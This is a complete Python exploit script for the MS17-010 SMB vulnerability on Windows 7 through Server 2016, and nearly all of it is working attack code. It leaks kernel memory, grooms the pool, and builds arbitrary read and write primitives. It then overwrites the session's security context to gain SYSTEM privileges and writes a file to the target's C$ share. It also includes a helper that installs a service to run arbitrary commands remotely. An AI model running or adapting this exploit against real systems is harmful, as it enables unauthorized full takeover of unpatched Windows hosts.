from impacket import smb, smbconnection
from mysmb import MYSMB
from struct import pack, unpack, unpack_from
import sys
import socket
import time
 
&#039;&#039;&#039;
MS17-010 exploit for Windows 7+ by sleepya
 
Note:
- The exploit should never crash a target (chance should be nearly 0%)
- The exploit use the bug same as eternalromance and eternalsynergy, so named pipe is needed
 
Tested on:
- Windows 2016 x64
- Windows 2012 R2 x64
- Windows 8.1 x64
- Windows 2008 R2 SP1 x64
- Windows 7 SP1 x64
- Windows 8.1 x86
- Windows 7 SP1 x86
&#039;&#039;&#039;
 
USERNAME = &#039;&#039;
PASSWORD = &#039;&#039;
 
&#039;&#039;&#039;
Reversed from: SrvAllocateSecurityContext() and SrvImpersonateSecurityContext()
win7 x64
struct SrvSecContext {
    DWORD xx1; // second WORD is size
    DWORD refCnt;
    PACCESS_TOKEN Token;  // 0x08
    DWORD xx2;
    BOOLEAN CopyOnOpen; // 0x14
    BOOLEAN EffectiveOnly;
    WORD xx3;
    DWORD ImpersonationLevel; // 0x18
    DWORD xx4;
    BOOLEAN UsePsImpersonateClient; // 0x20
}
win2012 x64
struct SrvSecContext {
    DWORD xx1; // second WORD is size
    DWORD refCnt;
    QWORD xx2;
    QWORD xx3;
    PACCESS_TOKEN Token;  // 0x18
    DWORD xx4;
    BOOLEAN CopyOnOpen; // 0x24
    BOOLEAN EffectiveOnly;
    WORD xx3;
    DWORD ImpersonationLevel; // 0x28
    DWORD xx4;
    BOOLEAN UsePsImpersonateClient; // 0x30
}
 
SrvImpersonateSecurityContext() is used in Windows 7 and later before doing any operation as logged on user.
It called PsImperonateClient() if SrvSecContext.UsePsImpersonateClient is true. 
From https://msdn.microsoft.com/en-us/library/windows/hardware/ff551907(v=vs.85).aspx, if Token is NULL,
PsImperonateClient() ends the impersonation. Even there is no impersonation, the PsImperonateClient() returns
STATUS_SUCCESS when Token is NULL.
If we can overwrite Token to NULL and UsePsImpersonateClient to true, a running thread will use primary token (SYSTEM)
to do all SMB operations.
Note: fake Token might be possible, but NULL token is much easier.
&#039;&#039;&#039;
WIN7_INFO = {
    &#039;SESSION_SECCTX_OFFSET&#039;: 0xa0,
    &#039;SESSION_ISNULL_OFFSET&#039;: 0xba,
    &#039;FAKE_SECCTX&#039;: pack(&#039;<IIQQIIB&#039;, 0x28022a, 1, 0, 0, 2, 0, 1),
    &#039;SECCTX_SIZE&#039;: 0x28,
}
 
WIN7_32_INFO = {
    &#039;SESSION_SECCTX_OFFSET&#039;: 0x80,
    &#039;SESSION_ISNULL_OFFSET&#039;: 0x96,
    &#039;FAKE_SECCTX&#039;: pack(&#039;<IIIIIIB&#039;, 0x1c022a, 1, 0, 0, 2, 0, 1),
    &#039;SECCTX_SIZE&#039;: 0x1c,
}
 
# win8+ info
WIN8_INFO = {
    &#039;SESSION_SECCTX_OFFSET&#039;: 0xb0,
    &#039;SESSION_ISNULL_OFFSET&#039;: 0xca,
    &#039;FAKE_SECCTX&#039;: pack(&#039;<IIQQQQIIB&#039;, 0x38022a, 1, 0, 0, 0, 0, 2, 0, 1),
    &#039;SECCTX_SIZE&#039;: 0x38,
}
 
WIN8_32_INFO = {
    &#039;SESSION_SECCTX_OFFSET&#039;: 0x88,
    &#039;SESSION_ISNULL_OFFSET&#039;: 0x9e,
    &#039;FAKE_SECCTX&#039;: pack(&#039;<IIIIIIIIB&#039;, 0x24022a, 1, 0, 0, 0, 0, 2, 0, 1),
    &#039;SECCTX_SIZE&#039;: 0x24,
}
 
X86_INFO = {
    &#039;PTR_SIZE&#039; : 4,
    &#039;PTR_FMT&#039; : &#039;I&#039;,
    &#039;FRAG_TAG_OFFSET&#039; : 12,
    &#039;POOL_ALIGN&#039; : 8,
    &#039;SRV_BUFHDR_SIZE&#039; : 8,
    &#039;TRANS_SIZE&#039; : 0xa0,  # struct size
    &#039;TRANS_FLINK_OFFSET&#039; : 0x18,
    &#039;TRANS_INPARAM_OFFSET&#039; : 0x40,
    &#039;TRANS_OUTPARAM_OFFSET&#039; : 0x44,
    &#039;TRANS_INDATA_OFFSET&#039; : 0x48,
    &#039;TRANS_OUTDATA_OFFSET&#039; : 0x4c,
    &#039;TRANS_FUNCTION_OFFSET&#039; : 0x72,
    &#039;TRANS_MID_OFFSET&#039; : 0x80,
}
 
X64_INFO = {
    &#039;PTR_SIZE&#039; : 8,
    &#039;PTR_FMT&#039; : &#039;Q&#039;,
    &#039;FRAG_TAG_OFFSET&#039; : 0x14,
    &#039;POOL_ALIGN&#039; : 0x10,
    &#039;SRV_BUFHDR_SIZE&#039; : 0x10,
    &#039;TRANS_SIZE&#039; : 0xf8,  # struct size
    &#039;TRANS_FLINK_OFFSET&#039; : 0x28,
    &#039;TRANS_INPARAM_OFFSET&#039; : 0x70,
    &#039;TRANS_OUTPARAM_OFFSET&#039; : 0x78,
    &#039;TRANS_INDATA_OFFSET&#039; : 0x80,
    &#039;TRANS_OUTDATA_OFFSET&#039; : 0x88,
    &#039;TRANS_FUNCTION_OFFSET&#039; : 0xb2,
    &#039;TRANS_MID_OFFSET&#039; : 0xc0,
}
 
 
def wait_for_request_processed(conn):
    #time.sleep(0.05)
    # send echo is faster than sleep(0.05) when connection is very good
    conn.send_echo(&#039;a&#039;)
 
special_mid = 0
extra_last_mid = 0
def reset_extra_mid(conn):
    global extra_last_mid, special_mid
    special_mid = (conn.next_mid() & 0xff00) - 0x100
    extra_last_mid = special_mid
     
def next_extra_mid():
    global extra_last_mid
    extra_last_mid += 1
    return extra_last_mid
 
# Borrow &#039;groom&#039; and &#039;bride&#039; word from NSA tool
# GROOM_TRANS_SIZE includes transaction name, parameters and data
GROOM_TRANS_SIZE = 0x5010
 
 
def calc_alloc_size(size, align_size):
    return (size + align_size - 1) & ~(align_size-1)
 
def leak_frag_size(conn, tid, fid, info):
    # A "Frag" pool is placed after the large pool allocation if last page has some free space left.
    # A "Frag" pool size (on 64-bit) is 0x10 or 0x20 depended on Windows version.
    # To make exploit more generic, exploit does info leak to find a "Frag" pool size.
    # From the leak info, we can determine the target architecture too.
    mid = conn.next_mid()
    req1 = conn.create_nt_trans_packet(5, param=pack(&#039;<HH&#039;, fid, 0), mid=mid, data=&#039;A&#039;*0x10d0, maxParameterCount=GROOM_TRANS_SIZE-0x10d0-4)
    req2 = conn.create_nt_trans_secondary_packet(mid, data=&#039;B&#039;*276) # leak more 276 bytes
     
    conn.send_raw(req1[:-8])
    conn.send_raw(req1[-8:]+req2)
    leakData = conn.recv_transaction_data(mid, 0x10d0+276)
    leakData = leakData[0x10d4:]  # skip parameters and its own input
    if leakData[X86_INFO[&#039;FRAG_TAG_OFFSET&#039;]:X86_INFO[&#039;FRAG_TAG_OFFSET&#039;]+4] == &#039;Frag&#039;:
        print(&#039;Target is 32 bit&#039;)
        if info[&#039;SESSION_SECCTX_OFFSET&#039;] == WIN7_INFO[&#039;SESSION_SECCTX_OFFSET&#039;]:
            info.update(WIN7_32_INFO)
        elif info[&#039;SESSION_SECCTX_OFFSET&#039;] == WIN8_INFO[&#039;SESSION_SECCTX_OFFSET&#039;]:
            info.update(WIN8_32_INFO)
        else:
            print(&#039;The exploit does not support this 32 bit target&#039;)
            sys.exit()
        info.update(X86_INFO)
    elif leakData[X64_INFO[&#039;FRAG_TAG_OFFSET&#039;]:X64_INFO[&#039;FRAG_TAG_OFFSET&#039;]+4] == &#039;Frag&#039;:
        print(&#039;Target is 64 bit&#039;)
        info.update(X64_INFO)
    else:
        print(&#039;Not found Frag pool tag in leak data&#039;)
        sys.exit()
     
    # Calculate frag pool size
    info[&#039;FRAG_POOL_SIZE&#039;] = ord(leakData[ info[&#039;FRAG_TAG_OFFSET&#039;]-2 ]) * info[&#039;POOL_ALIGN&#039;]
    print(&#039;Got frag size: 0x{:x}&#039;.format(info[&#039;FRAG_POOL_SIZE&#039;]))
 
    # groom: srv buffer header
    info[&#039;GROOM_POOL_SIZE&#039;] = calc_alloc_size(GROOM_TRANS_SIZE + info[&#039;SRV_BUFHDR_SIZE&#039;] + info[&#039;POOL_ALIGN&#039;], info[&#039;POOL_ALIGN&#039;])
    print(&#039;GROOM_POOL_SIZE: 0x{:x}&#039;.format(info[&#039;GROOM_POOL_SIZE&#039;]))
    # groom paramters and data is alignment by 8 because it is NT_TRANS
    info[&#039;GROOM_DATA_SIZE&#039;] = GROOM_TRANS_SIZE - 4 - 4 - info[&#039;TRANS_SIZE&#039;]  # empty transaction name (4), alignment (4)
 
    # bride: srv buffer header, pool header (same as pool align size), empty transaction name (4)
    bridePoolSize = 0x1000 - (info[&#039;GROOM_POOL_SIZE&#039;] & 0xfff) - info[&#039;FRAG_POOL_SIZE&#039;]
    info[&#039;BRIDE_TRANS_SIZE&#039;] = bridePoolSize - (info[&#039;SRV_BUFHDR_SIZE&#039;] + info[&#039;POOL_ALIGN&#039;])
    print(&#039;BRIDE_TRANS_SIZE: 0x{:x}&#039;.format(info[&#039;BRIDE_TRANS_SIZE&#039;]))
    # bride paramters and data is alignment by 4 because it is TRANS
    info[&#039;BRIDE_DATA_SIZE&#039;] = info[&#039;BRIDE_TRANS_SIZE&#039;] - 4 - info[&#039;TRANS_SIZE&#039;]  # empty transaction name (4)
 
    return info[&#039;FRAG_POOL_SIZE&#039;]
 
 
def align_transaction_and_leak(conn, tid, fid, info, numFill=4):
    trans_param = pack(&#039;<HH&#039;, fid, 0)  # param for NT_RENAME
    # fill large pagedpool holes (maybe no need)
    for i in range(numFill):
        conn.send_nt_trans(5, param=trans_param, totalDataCount=0x10d0, maxParameterCount=GROOM_TRANS_SIZE-0x10d0)
 
    mid_ntrename = conn.next_mid()
    req1 = conn.create_nt_trans_packet(5, param=trans_param, mid=mid_ntrename, data=&#039;A&#039;*0x10d0, maxParameterCount=info[&#039;GROOM_DATA_SIZE&#039;]-0x10d0)
    req2 = conn.create_nt_trans_secondary_packet(mid_ntrename, data=&#039;B&#039;*276) # leak more 276 bytes
 
    req3 = conn.create_nt_trans_packet(5, param=trans_param, mid=fid, totalDataCount=info[&#039;GROOM_DATA_SIZE&#039;]-0x1000, maxParameterCount=0x1000)
    reqs = []
    for i in range(12):
        mid = next_extra_mid()
        reqs.append(conn.create_trans_packet(&#039;&#039;, mid=mid, param=trans_param, totalDataCount=info[&#039;BRIDE_DATA_SIZE&#039;]-0x200, totalParameterCount=0x200, maxDataCount=0, maxParameterCount=0))
 
    conn.send_raw(req1[:-8])
    conn.send_raw(req1[-8:]+req2+req3+&#039;&#039;.join(reqs))
     
    # expected transactions alignment ("Frag" pool is not shown)
    #
    #    |         5 * PAGE_SIZE         |   PAGE_SIZE    |         5 * PAGE_SIZE         |   PAGE_SIZE    |
    #    +-------------------------------+----------------+-------------------------------+----------------+
    #    |    GROOM mid=mid_ntrename        |  extra_mid1 |         GROOM mid=fid            |  extra_mid2 |
    #    +-------------------------------+----------------+-------------------------------+----------------+
    #
    # If transactions are aligned as we expected, BRIDE transaction with mid=extra_mid1 will be leaked.
    # From leaked transaction, we get
    # - leaked transaction address from InParameter or InData
    # - transaction, with mid=extra_mid2, address from LIST_ENTRY.Flink
    # With these information, we can verify the transaction aligment from displacement.
 
    leakData = conn.recv_transaction_data(mid_ntrename, 0x10d0+276)
    leakData = leakData[0x10d4:]  # skip parameters and its own input
    #open(&#039;leak.dat&#039;, &#039;wb&#039;).write(leakData)
 
    if leakData[info[&#039;FRAG_TAG_OFFSET&#039;]:info[&#039;FRAG_TAG_OFFSET&#039;]+4] != &#039;Frag&#039;:
        print(&#039;Not found Frag pool tag in leak data&#039;)
        return None
     
    # ================================
    # verify leak data
    # ================================
    leakData = leakData[info[&#039;FRAG_TAG_OFFSET&#039;]-4+info[&#039;FRAG_POOL_SIZE&#039;]:]
    # check pool tag and size value in buffer header
    expected_size = pack(&#039;<H&#039;, info[&#039;BRIDE_TRANS_SIZE&#039;])
    leakTransOffset = info[&#039;POOL_ALIGN&#039;] + info[&#039;SRV_BUFHDR_SIZE&#039;]
    if leakData[0x4:0x8] != &#039;LStr&#039; or leakData[info[&#039;POOL_ALIGN&#039;]:info[&#039;POOL_ALIGN&#039;]+2] != expected_size or leakData[leakTransOffset+2:leakTransOffset+4] != expected_size:
        print(&#039;No transaction struct in leak data&#039;)
        return None
 
    leakTrans = leakData[leakTransOffset:]
 
    ptrf = info[&#039;PTR_FMT&#039;]
    _, connection_addr, session_addr, treeconnect_addr, flink_value = unpack_from(&#039;<&#039;+ptrf*5, leakTrans, 8)
    inparam_value = unpack_from(&#039;<&#039;+ptrf, leakTrans, info[&#039;TRANS_INPARAM_OFFSET&#039;])[0]
    leak_mid = unpack_from(&#039;<H&#039;, leakTrans, info[&#039;TRANS_MID_OFFSET&#039;])[0]
 
    print(&#039;CONNECTION: 0x{:x}&#039;.format(connection_addr))
    print(&#039;SESSION: 0x{:x}&#039;.format(session_addr))
    print(&#039;FLINK: 0x{:x}&#039;.format(flink_value))
    print(&#039;InParam: 0x{:x}&#039;.format(inparam_value))
    print(&#039;MID: 0x{:x}&#039;.format(leak_mid))
 
    next_page_addr = (inparam_value & 0xfffffffffffff000) + 0x1000
    if next_page_addr + info[&#039;GROOM_POOL_SIZE&#039;] + info[&#039;FRAG_POOL_SIZE&#039;] + info[&#039;POOL_ALIGN&#039;] + info[&#039;SRV_BUFHDR_SIZE&#039;] + info[&#039;TRANS_FLINK_OFFSET&#039;] != flink_value:
        print(&#039;unexpected alignment, diff: 0x{:x}&#039;.format(flink_value - next_page_addr))
        return None
    # trans1: leak transaction
    # trans2: next transaction
    return {
        &#039;connection&#039;: connection_addr,
        &#039;session&#039;: session_addr,
        &#039;next_page_addr&#039;: next_page_addr,
        &#039;trans1_mid&#039;: leak_mid,
        &#039;trans1_addr&#039;: inparam_value - info[&#039;TRANS_SIZE&#039;] - 4,
        &#039;trans2_addr&#039;: flink_value - info[&#039;TRANS_FLINK_OFFSET&#039;],
        &#039;special_mid&#039;: special_mid,
    }
 
def read_data(conn, info, read_addr, read_size):
    fmt = info[&#039;PTR_FMT&#039;]
    # modify trans2.OutParameter to leak next transaction and trans2.OutData to leak real data
    # modify trans2.*ParameterCount and trans2.*DataCount to limit data
    new_data = pack(&#039;<&#039;+fmt*3, info[&#039;trans2_addr&#039;]+info[&#039;TRANS_FLINK_OFFSET&#039;], info[&#039;trans2_addr&#039;]+0x200, read_addr)  # OutParameter, InData, OutData
    new_data += pack(&#039;<II&#039;, 0, 0)  # SetupCount, MaxSetupCount
    new_data += pack(&#039;<III&#039;, 8, 8, 8)  # ParamterCount, TotalParamterCount, MaxParameterCount
    new_data += pack(&#039;<III&#039;, read_size, read_size, read_size)  # DataCount, TotalDataCount, MaxDataCount
    new_data += pack(&#039;<HH&#039;, 0, 5)  # Category, Function (NT_RENAME)
    conn.send_nt_trans_secondary(mid=info[&#039;trans1_mid&#039;], data=new_data, dataDisplacement=info[&#039;TRANS_OUTPARAM_OFFSET&#039;])
     
    # create one more transaction before leaking data
    # - next transaction can be used for arbitrary read/write after the current trans2 is done
    # - next transaction address is from TransactionListEntry.Flink value
    conn.send_nt_trans(5, param=pack(&#039;<HH&#039;, info[&#039;fid&#039;], 0), totalDataCount=0x4300-0x20, totalParameterCount=0x1000)
 
    # finish the trans2 to leak
    conn.send_nt_trans_secondary(mid=info[&#039;trans2_mid&#039;])
    read_data = conn.recv_transaction_data(info[&#039;trans2_mid&#039;], 8+read_size)
     
    # set new trans2 address
    info[&#039;trans2_addr&#039;] = unpack_from(&#039;<&#039;+fmt, read_data)[0] - info[&#039;TRANS_FLINK_OFFSET&#039;]
     
    # set trans1.InData to &trans2
    conn.send_nt_trans_secondary(mid=info[&#039;trans1_mid&#039;], param=pack(&#039;<&#039;+fmt, info[&#039;trans2_addr&#039;]), paramDisplacement=info[&#039;TRANS_INDATA_OFFSET&#039;])
    wait_for_request_processed(conn)
 
    # modify trans2 mid
    conn.send_nt_trans_secondary(mid=info[&#039;trans1_mid&#039;], data=pack(&#039;<H&#039;, info[&#039;trans2_mid&#039;]), dataDisplacement=info[&#039;TRANS_MID_OFFSET&#039;])
    wait_for_request_processed(conn)
     
    return read_data[8:]  # no need to return parameter
 
 
def write_data(conn, info, write_addr, write_data):
    # trans2.InData
    conn.send_nt_trans_secondary(mid=info[&#039;trans1_mid&#039;], data=pack(&#039;<&#039;+info[&#039;PTR_FMT&#039;], write_addr), dataDisplacement=info[&#039;TRANS_INDATA_OFFSET&#039;])
    wait_for_request_processed(conn)
     
    # write data
    conn.send_nt_trans_secondary(mid=info[&#039;trans2_mid&#039;], data=write_data)
    wait_for_request_processed(conn)
 
 
def exploit(target, pipe_name):
    conn = MYSMB(target)
     
    # set NODELAY to make exploit much faster
    conn.get_socket().setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 
    info = {}
 
    conn.login(USERNAME, PASSWORD, maxBufferSize=4356)
    server_os = conn.get_server_os()
    print(&#039;Target OS: &#039;+server_os)
    if server_os.startswith("Windows 7 ") or server_os.startswith("Windows Server 2008 R2"):
        info.update(WIN7_INFO)
    elif server_os.startswith("Windows 8") or server_os.startswith("Windows Server 2012 ") or server_os.startswith("Windows Server 2016 "):
        info.update(WIN8_INFO)
    else:
        print(&#039;This exploit does not support this target&#039;)
        sys.exit()
 
    # ================================
    # try align pagedpool and leak info until satisfy
    # ================================
    leakInfo = None
    # max attempt: 10
    for i in range(10):
        tid = conn.tree_connect_andx(&#039;\\\\&#039;+target+&#039;\\&#039;+&#039;IPC$&#039;)
        conn.set_default_tid(tid)
        # fid for first open is always 0x4000. We can open named pipe multiple times to get other fids.
        fid = conn.nt_create_andx(tid, pipe_name)
        if &#039;FRAG_POOL_SIZE&#039; not in info:
            leak_frag_size(conn, tid, fid, info)
        reset_extra_mid(conn)
        leakInfo = align_transaction_and_leak(conn, tid, fid, info)
        if leakInfo is not None:
            break
        print(&#039;leak failed... try again&#039;)
        conn.close(tid, fid)
        conn.disconnect_tree(tid)
    if leakInfo is None:
        return False
     
    info[&#039;fid&#039;] = fid
    info.update(leakInfo)
 
    # ================================
    # shift trans1.Indata ptr with SmbWriteAndX
    # ================================
    shift_indata_byte = 0x200
    conn.do_write_andx_raw_pipe(fid, &#039;A&#039;*shift_indata_byte)
 
    # Note: Even the distance between bride transaction is exactly what we want, the groom transaction might be in a wrong place.
    #       So the below operation is still dangerous. Write only 1 byte with &#039;\x00&#039; might be safe even alignment is wrong.
    # maxParameterCount (0x1000), trans name (4), param (4)
    indata_value = info[&#039;next_page_addr&#039;] + info[&#039;TRANS_SIZE&#039;] + 8 + info[&#039;SRV_BUFHDR_SIZE&#039;] + 0x1000 + shift_indata_byte
    indata_next_trans_displacement = info[&#039;trans2_addr&#039;] - indata_value
    conn.send_nt_trans_secondary(mid=fid, data=&#039;\x00&#039;, dataDisplacement=indata_next_trans_displacement + info[&#039;TRANS_MID_OFFSET&#039;])
    wait_for_request_processed(conn)
 
    # if the overwritten is correct, a modified transaction mid should be special_mid now.
    # a new transaction with special_mid should be error.
    recvPkt = conn.send_nt_trans(5, mid=special_mid, param=pack(&#039;<HH&#039;, fid, 0), data=&#039;&#039;)
    if recvPkt.getNTStatus() != 0x10002:  # invalid SMB
        print(&#039;unexpected return status: 0x{:x}&#039;.format(recvPkt.getNTStatus()))
        print(&#039;!!! Write to wrong place !!!&#039;)
        print(&#039;the target might be crashed&#039;)
        sys.exit()
 
    print(&#039;success controlling groom transaction&#039;)
 
    # NSA exploit set refCnt on leaked transaction to very large number for reading data repeatly
    # but this method make the transation never get freed
    # I will avoid memory leak
     
    # ================================
    # modify trans1 struct to be used for arbitrary read/write
    # ================================
    print(&#039;modify trans1 struct for arbitrary read/write&#039;)
    fmt = info[&#039;PTR_FMT&#039;]
    # modify trans_special.InData to &trans1
    conn.send_nt_trans_secondary(mid=fid, data=pack(&#039;<&#039;+fmt, info[&#039;trans1_addr&#039;]), dataDisplacement=indata_next_trans_displacement + info[&#039;TRANS_INDATA_OFFSET&#039;])
    wait_for_request_processed(conn)
 
    # modify
    # - trans1.InParameter to &trans1. so we can modify trans1 struct with itself
    # - trans1.InData to &trans2. so we can modify trans2 easily
    conn.send_nt_trans_secondary(mid=info[&#039;special_mid&#039;], data=pack(&#039;<&#039;+fmt*3, info[&#039;trans1_addr&#039;], info[&#039;trans1_addr&#039;]+0x200, info[&#039;trans2_addr&#039;]), dataDisplacement=info[&#039;TRANS_INPARAM_OFFSET&#039;])
    wait_for_request_processed(conn)
 
    # modify trans2.mid
    info[&#039;trans2_mid&#039;] = conn.next_mid()
    conn.send_nt_trans_secondary(mid=info[&#039;trans1_mid&#039;], data=pack(&#039;<H&#039;, info[&#039;trans2_mid&#039;]), dataDisplacement=info[&#039;TRANS_MID_OFFSET&#039;])
 
    # Now, read_data() and write_data() can be used for arbitrary read and write.
    # ================================
    # Modify this SMB session to be SYSTEM
    # ================================  
    # Note: Windows XP stores only PCtxtHandle and uses ImpersonateSecurityContext() for impersonation, so this
    #         method does not work on Windows XP. But with arbitrary read/write, code execution is not difficult.
     
    print(&#039;make this SMB session to be SYSTEM&#039;)
    # IsNullSession = 0, IsAdmin = 1
    write_data(conn, info, info[&#039;session&#039;]+info[&#039;SESSION_ISNULL_OFFSET&#039;], &#039;\x00\x01&#039;)
 
    # read session struct to get SecurityContext address
    sessionData = read_data(conn, info, info[&#039;session&#039;], 0x100)
    secCtxAddr = unpack_from(&#039;<&#039;+fmt, sessionData, info[&#039;SESSION_SECCTX_OFFSET&#039;])[0]
 
    # copy SecurityContext for restoration
    secCtxData = read_data(conn, info, secCtxAddr, info[&#039;SECCTX_SIZE&#039;])
 
    print(&#039;overwriting session security context&#039;)
    # see FAKE_SECCTX detail at top of the file
    write_data(conn, info, secCtxAddr, info[&#039;FAKE_SECCTX&#039;])
 
    # ================================
    # do whatever we want as SYSTEM over this SMB connection
    # ================================  
    try:
        smb_pwn(conn)
    except:
        pass
 
    # restore SecurityContext. If the exploit does not use null session, PCtxtHandle will be leaked.
    write_data(conn, info, secCtxAddr, secCtxData)
 
    conn.disconnect_tree(tid)
    conn.logoff()
    conn.get_socket().close()
    return True
 
def smb_pwn(conn):
    smbConn = smbconnection.SMBConnection(conn.get_remote_host(), conn.get_remote_host(), existingConnection=conn, manualNegotiate=True)
     
    print(&#039;creating file c:\\pwned.txt on the target&#039;)
    tid2 = smbConn.connectTree(&#039;C$&#039;)
    fid2 = smbConn.createFile(tid2, &#039;/pwned.txt&#039;)
    smbConn.closeFile(tid2, fid2)
    smbConn.disconnectTree(tid2)
     
    #service_exec(smbConn, r&#039;cmd /c copy c:\pwned.txt c:\pwned_exec.txt&#039;)
 
# based on impacket/examples/serviceinstall.py
def service_exec(smbConn, cmd):
    import random
    import string
    from impacket.dcerpc.v5 import transport, srvs, scmr
     
    service_name = &#039;&#039;.join([random.choice(string.letters) for i in range(4)])
 
    # Setup up a DCE SMBTransport with the connection already in place
    rpctransport = transport.SMBTransport(smbConn.getRemoteHost(), smbConn.getRemoteHost(), filename=r&#039;\svcctl&#039;, smb_connection=smbConn)
    rpcsvc = rpctransport.get_dce_rpc()
    rpcsvc.connect()
    rpcsvc.bind(scmr.MSRPC_UUID_SCMR)
    svnHandle = None
    try:
        print("Opening SVCManager on %s....." % smbConn.getRemoteHost())
        resp = scmr.hROpenSCManagerW(rpcsvc)
        svcHandle = resp[&#039;lpScHandle&#039;]
         
        # First we try to open the service in case it exists. If it does, we remove it.
        try:
            resp = scmr.hROpenServiceW(rpcsvc, svcHandle, service_name+&#039;\x00&#039;)
        except Exception, e:
            if str(e).find(&#039;ERROR_SERVICE_DOES_NOT_EXIST&#039;) == -1:
                raise e  # Unexpected error
        else:
            # It exists, remove it
            scmr.hRDeleteService(rpcsvc, resp[&#039;lpServiceHandle&#039;])
            scmr.hRCloseServiceHandle(rpcsvc, resp[&#039;lpServiceHandle&#039;])
         
        print(&#039;Creating service %s.....&#039; % service_name)
        resp = scmr.hRCreateServiceW(rpcsvc, svcHandle, service_name + &#039;\x00&#039;, service_name + &#039;\x00&#039;, lpBinaryPathName=cmd + &#039;\x00&#039;)
        serviceHandle = resp[&#039;lpServiceHandle&#039;]
         
        if serviceHandle:
            # Start service
            try:
                print(&#039;Starting service %s.....&#039; % service_name)
                scmr.hRStartServiceW(rpcsvc, serviceHandle)
                # is it really need to stop?
                # using command line always makes starting service fail because SetServiceStatus() does not get called
                print(&#039;Stoping service %s.....&#039; % service_name)
                scmr.hRControlService(rpcsvc, serviceHandle, scmr.SERVICE_CONTROL_STOP)
            except Exception, e:
                print(str(e))
             
            print(&#039;Removing service %s.....&#039; % service_name)
            scmr.hRDeleteService(rpcsvc, serviceHandle)
            scmr.hRCloseServiceHandle(rpcsvc, serviceHandle)
    except Exception, e:
        print("ServiceExec Error on: %s" % smbConn.getRemoteHost())
        print(str(e))
    finally:
        if svcHandle:
            scmr.hRCloseServiceHandle(rpcsvc, svcHandle)
 
    rpcsvc.disconnect()
 
 
if len(sys.argv) != 3:
    print("{} <ip> <pipe_name>".format(sys.argv[0]))
    sys.exit(1)
 
target = sys.argv[1]
pipe_name = sys.argv[2]
 
exploit(target, pipe_name)
print(&#039;Done&#039;)

